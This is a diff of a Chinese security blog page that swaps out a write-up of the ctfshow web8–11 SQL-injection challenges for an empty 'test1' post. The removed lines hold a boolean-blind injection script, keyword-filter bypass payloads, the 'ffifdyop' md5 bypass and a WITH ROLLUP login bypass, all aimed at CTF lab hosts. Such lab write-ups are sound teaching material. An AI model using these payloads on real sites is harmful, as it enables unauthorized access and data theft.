@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow_web8-11sql注入wp, 0xahh的博客">
+    <meta name="keywords" content="test1, 0xahh的博客">
     <meta name="description" content="技术">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow_web8-11sql注入wp | 0xahh的博客</title>
+    <title>test1 | 0xahh的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow_web8-11sql注入wp</h1>
+                    <h1 class="description center-align post-title">test1</h1>
                 </div>
             </div>
         </div>
@@ -429,29 +429,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
-                            </a>
-                        
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                web安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -460,28 +443,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-10
+                    2021-02-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-18
+                    2021-02-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    1 分
                 </div>
                 
 
@@ -504,132 +487,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="/images/image-20201116211806656.png"></p>
-<p>打开可以看到是get型的注入，试一下：</p>
-<p>发现对单引号，空格都进行了过滤，尝试过滤：</p>
-<p><code>http://54a2bc21-f382-4e3d-a315-8c23ed58a0f3.chall.ctf.show/index.php?id=1/**/or/**/1=1/**/#</code></p>
-<p>可以看到回显，尝试使用union select进行注入，发现union被过滤，尝试大小写，嵌套union绕过，失败，那就不能用union了，使用布尔盲注</p>
-<p><code>http://54a2bc21-f382-4e3d-a315-8c23ed58a0f3.chall.ctf.show/index.php?id=-1/**/or/**/(select(ascii(substr(database(),1,1)))=124)/**/#</code></p>
-<p>发现逗号也被过滤掉了，选择别的方法做substr：</p>
-<p><img src="/images/image-20201116213907911.png"></p>
-<p>使用了from 1 for 1 可以替代1,1这样可以看到回显，接下来就跑脚本就好了：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#本题为ctfshow中web8，做了逗号，分号，union过滤，需要用到布尔盲注以及对逗号分号的绕过</span>
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> sys
-table<span class="token operator">=</span><span class="token string">''</span> 
-urlOpen<span class="token operator">=</span><span class="token string">"http://e064a804-0e90-4afd-a606-c2f5bca1620f.chall.ctf.show/index.php?id="</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
-        <span class="token comment">#database</span>
-        <span class="token comment"># payload="0/**/or/**/(ascii(substr((select/**/database())from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>
-        <span class="token comment">#库名</span>
-        <span class="token comment"># payload="0/**/or/**/(ascii(substr((select/**/group_concat(schema_name)from/**/information_schema.schemata)from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>
-        <span class="token comment">#表名</span>
-        <span class="token comment">#payload="0/**/or/**/(ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>
-        <span class="token comment">#列名(分号被过滤了，可以用16进制来表示字符串：用编码转换工具转换你要的字符串，前缀 0x 即可。)</span>
-        <span class="token comment">#payload="0/**/or/**/(ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=0x666c6167)from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>
-        <span class="token comment">#找出flag</span>
-        payload<span class="token operator">=</span><span class="token string">"0/**/or/**/(ascii(substr((select/**/group_concat(flag)from/**/flag)from/**/%d/**/for/**/1)))=%d#"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
-        url <span class="token operator">=</span> urlOpen <span class="token operator">+</span> payload
-        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
-        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
-            table<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>
-            <span class="token keyword">break</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>最后得到flag</p>
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="/images/image-20201116214319756.png"></p>
-<p>一个登陆界面，先试一试，尝试万能密码不管用，别的方法也没找到有明显的不同的，看了一下师傅们 的博客，嗯，index.phps拿源码看，啊这，脑洞还是不够大，我是</p>
-<p><img src="/images/0750AAF4.jpg"></p>
-<p>看一下源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
-        <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token double-quoted-string string">"select * from user where username ='admin' and password ='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span>
-        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                         <span class="token keyword">echo</span> <span class="token double-quoted-string string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span>
-                         <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-                     <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span>
-    <span class="token delimiter important">?></span></span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这里考察了一个**<em>md5函数**</em>的漏洞，这个函数的调用是为了方便与数据库中加密后的数据进行对比，这里的这个函数的第二个参数默认为<strong>false</strong>，这样会生成一个常规的32位MD5值，但为true的时候就存在漏洞了，当第二个参数为true时，生成的是一个原生的16字符的二进制格式，这意味着，<strong>这里有可能人为输入一个字符串，经加密后的值以二进制格式生成，又被当字符串处理</strong>，让新的字符串中含有可以构造SQL万能密码的’or’的万能密码部分，可以在网上找到这样的payload：</p>
-<pre class="line-numbers language-none"><code class="language-none">ffifdyop
-129581926211651571912466741651878684928<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>这两个都可以构造出我们想要的or 万能密码，直接输入密码框就行了，这里如果password位数大于10会直接报错，所以用第一个就好了。</p>
-<p><img src="/images/image-20201116220736606.png"></p>
-<p>得到flag，看似是直接输入密码得到的flag，不知道还以为是爆破出来的，<del>建议把这个字符串加入爆破字典</del>。</p>
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="/images/image-20201116223551053.png"></p>
-<p>依然需要使用index.phps得到源码查看</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
-        <span class="token keyword">function</span> <span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>
-             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
-        <span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token double-quoted-string string">"select * from user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
-        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span>
-                            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-                        <span class="token punctuation">&#125;</span>
-
-                     <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span>
-    <span class="token delimiter important">?></span></span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>过滤的很多，基本啥都过滤了，没思路了，看了hint，说是虚拟表绕过，再看了一下网上的教程，用的是<strong>with rollup</strong>进行注入。</p>
-<p>先简单记录with rollup进行记录，这是一个用在group by后的语句，是对group by分类后的数据再一次进行统计汇总的功能，如果一列的数据不满足with rollup的条件（该列的数据的属性是不相同的）就会在该列中生成一条NULL数据，我们就利用这条NULL数据来进行注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">password&#x3D;&amp;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup&#x2F;**&#x2F;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>在group by password后，使用with rollup，我们的目的是使得sql查询到的语句为空，让后面的password进行判断时（就是不输入密码时）与这个NULL进行匹配，达到登录成功的目的，输入上面的payload就可以得到flag了，</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;password&#x2F;**&#x2F;WITH&#x2F;**&#x2F;ROLLUP&#x2F;**&#x2F;LIMIT&#x2F;**&#x2F;1&#x2F;**&#x2F;OFFSET&#x2F;**&#x2F;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>offset后面的值需要尝试才能找到pwd是null的行,但这道题直接就匹配到了，就这样了。</p>
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/images/image-20201118121613857.png"></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-        <span class="token keyword">function</span> <span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>
-             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token shell-comment comment">#session</span>
-            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token delimiter important">?></span></span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这是给出的代码，看起来和web10很像，但其实这里使用session来判断密码是否相同，session中的password储存在本地的，所以只要删除cookie中的密码，并输入面为空，再登录就可以得到flag了</p>
-
+                
                 
             </div>
             <hr/>
@@ -655,7 +513,7 @@ urlOpen<span class="token operator">=</span><span class="token string">"http://e
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://0xahh.top/2020/11/10/ctfshow-web8-10sql-zhu-ru-wp/">http://0xahh.top/2020/11/10/ctfshow-web8-10sql-zhu-ru-wp/</a>
+                    <a href="http://0xahh.top/2021/02/25/test1/">http://0xahh.top/2021/02/25/test1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -692,15 +550,7 @@ urlOpen<span class="token operator">=</span><span class="token string">"http://e
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
-                                </a>
-                            
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1131,57 +981,39 @@ urlOpen<span class="token operator">=</span><span class="token string">"http://e
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/25/xin-xi-shou-ji-ctfshow/">
+                <a href="/2021/02/25/test1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="信息收集+爆破-ctfshow_wp">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="test1">
                         
-                        <span class="card-title">信息收集+爆破-ctfshow_wp</span>
+                        <span class="card-title">test1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            对ctfshowweb入门信息泄露及爆破进行writeup记录
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-25
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    web安全
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xahh
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/witeup/">
-                        <span class="chip bg-color">witeup</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -1192,31 +1024,31 @@ urlOpen<span class="token operator">=</span><span class="token string">"http://e
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/02/gong-fang-shi-jie-php2-wp/">
+                <a href="/2021/02/08/machine-learning/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="攻防世界PHP2_wp">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="machine_learning记录">
                         
-                        <span class="card-title">攻防世界PHP2_wp</span>
+                        <span class="card-title">machine_learning记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            攻防世界PHP2writeup简记
+                            对机器学习的一个记录
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    web安全
+                            <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    机器学习
                                 </a>
                             
                             
@@ -1226,16 +1058,12 @@ urlOpen<span class="token operator">=</span><span class="token string">"http://e
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">机器学习</span>
                     </a>
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/writeup/">
-                        <span class="chip bg-color">writeup</span>
+                    <a href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">深度学习</span>
                     </a>
                     
                 </div>
